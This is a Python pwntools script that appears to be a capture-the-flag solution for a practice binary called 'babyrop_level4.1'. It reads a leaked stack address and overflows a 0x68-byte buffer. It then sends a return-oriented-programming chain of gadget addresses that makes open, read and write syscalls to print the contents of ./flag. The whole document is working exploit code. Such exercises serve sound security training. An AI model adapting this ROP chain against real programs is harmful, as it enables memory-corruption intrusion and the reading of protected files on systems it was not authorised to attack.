from pwn import *

binary = './babyrop_level4.1'
elf = ELF(binary)
context.binary = binary
p = process(binary)

syscall = 0x000000000040143c
pop_rdi = 0x000000000040142c
pop_rax = 0x000000000040140d
pop_rsi = 0x0000000000401414
pop_rdx = 0x0000000000401405
mov_rdi_rax = 0x0000000000401683

#gdb.attach(p, '''
#b * challenge+395
#''')

leak_line = p.recvuntil(b"0x").decode()
leak_line += p.recvuntil(b".").decode().strip(".")


flagfile_addr = int(leak_line.split("0x")[1], 16)
flag_addr = elf.bss()


offset = 0x60 + 8
payload = flat(
	b'./flag\x00\x00',
	b'A' * (offset - len('./flag\x00\x00')),
	pop_rdi,
	flagfile_addr,
	pop_rsi,
	0,
	pop_rax,
	2,
	syscall,
	
	pop_rdi,
	3, # fd
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	pop_rax,
	0,
	syscall,
	
	pop_rdi,
	1,
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	pop_rax,
	1,
	syscall
	
)
p.sendline(payload)
p.interactive()
